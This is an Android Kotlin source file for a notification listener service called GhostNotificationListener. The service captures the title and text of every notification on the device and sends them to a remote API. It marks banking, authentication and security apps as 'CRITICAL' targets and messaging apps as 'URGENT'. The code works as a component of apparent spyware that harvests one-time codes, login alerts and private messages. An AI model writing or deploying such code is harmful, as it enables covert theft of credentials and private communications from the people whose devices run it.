package com.ghost.mobile.services

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.ghost.mobile.network.GhostApiClient

class GhostNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val pkg = sbn.packageName ?: "unknown"
        val extras = sbn.notification?.extras ?: return

        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""

        // Ignore empty or system noise
        if (title.isBlank() && text.isBlank()) return
        if (pkg == "android" || pkg == "com.android.systemui") return

        // Tactical priority classification
        val priority = when {
            pkg.contains("bank") || pkg.contains("auth") || pkg.contains("sec") -> "CRITICAL"
            pkg.contains("mail") || pkg.contains("slack") || pkg.contains("teams") -> "HIGH"
            pkg.contains("whatsapp") || pkg.contains("telegram") || pkg.contains("sms") -> "URGENT"
            else -> "STANDARD"
        }

        val deviceId = "ANDROID-NODE-01"
        GhostApiClient.sendNotification(
            deviceId = deviceId,
            appName = pkg,
            title = title,
            content = text,
            priority = priority
        )
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        // Optional removal hook
    }
}

